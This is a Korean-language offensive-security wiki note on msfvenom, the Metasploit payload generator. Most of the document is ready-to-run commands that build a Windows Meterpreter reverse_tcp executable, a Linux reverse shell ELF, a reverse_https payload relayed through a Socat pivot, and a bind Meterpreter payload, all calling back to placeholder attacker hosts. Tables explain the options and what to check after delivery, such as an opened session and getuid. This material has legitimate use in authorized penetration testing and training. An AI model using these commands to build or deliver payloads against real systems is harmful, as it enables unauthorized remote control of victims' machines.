---
tags:
  - 기능/세션관리
실행환경: ["Linux"]
필요조건: ["payload, platform, architecture와 출력 format"]
결과: ["페이로드", "파일", "shellcode"]
---

# msfvenom

## 도구 개요

`msfvenom`은 Metasploit payload를 대상 플랫폼·CPU 아키텍처와 실행 형식에 맞춘 파일 또는 raw shellcode로 생성하는 도구다. Reverse Shell, Bind Shell, Meterpreter payload를 전달 방식에 맞게 준비할 때 사용하며, 파일 생성 자체는 대상 실행이나 세션 획득을 보장하지 않는다.

## 필요한 입력과 실행 환경

- 실행 위치: Metasploit Framework가 설치된 Linux 호스트
- 필요한 입력: payload 이름, 대상 platform/architecture, 출력 format과 파일 경로
- 연결형 payload 입력: 대상에서 도달 가능한 `LHOST`/`LPORT`; 필요하면 bad character, encoder, template 조건


## 표준 사용법

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

## 대표 예시

### Windows Meterpreter 실행 파일 생성

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o shell.exe
```

### Linux reverse shell ELF 생성

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o shell.elf
```

### Socat 중계용 Windows reverse HTTPS payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_INTERNAL_IP> LPORT=<PIVOT_LISTEN_PORT> -f exe -o payload.exe
```

payload는 피벗 호스트의 Socat listener로 연결하고, Socat은 이 연결을 공격 호스트의 같은 payload handler로 전달한다. payload의 callback 포트와 공격 호스트 handler 포트가 서로 다를 수 있으므로 중계 양쪽 주소를 따로 확인한다.

### Socat 중계용 Windows bind Meterpreter payload

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=<INTERNAL_BIND_PORT> -f exe -o payload.exe
```

bind payload의 `LPORT`는 내부 대상이 수신할 포트다. 공격 호스트 handler는 Socat이 외부에 노출한 피벗 포트로 연결한다.

### 사용 가능한 payload 목록 확인

```bash
msfvenom -l payloads
```

## 주요 옵션

| 옵션 | 설명 |
| --- | --- |
| `-p` | payload 지정 |
| `LHOST`, `LPORT` | 콜백 IP와 포트 |
| `-f` | 출력 형식 지정(exe, elf, raw 등) |
| `-o` | 출력 파일명 |
| `-l` | payload/format/encoder 목록 확인 |
| `-a`, `--platform` | 아키텍처와 플랫폼 지정 |
| `-e`, `-b` | encoder와 bad character 지정 |


## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| payload 파일 생성 | 지정한 format/payload로 파일 생성 성공 | 대상 OS/architecture와 전달 방식에 맞는지 확인 |
| `Saved as: payload.exe` | 파일 생성 완료 | 대상 전달·실행 후 handler의 `session opened`와 `getuid`를 별도 확인 |
| raw shellcode 출력 | exploit 코드에 삽입할 payload 확보 | badchar, encoder, architecture 확인 |
| handler와 연결 안 됨 | LHOST/LPORT, egress, payload mismatch 문제 | listener, 방화벽, payload 타입 재확인 |
| 실행 실패 | 대상 환경과 format 불일치 | OS, architecture, 파일 확장자, 실행 권한 확인 |

## 관련 공격기법

- [[MSFVenom Payload 생성과 Handler 수신]]
- [[Reverse Shell 획득]]
- [[Bind Shell 획득]]
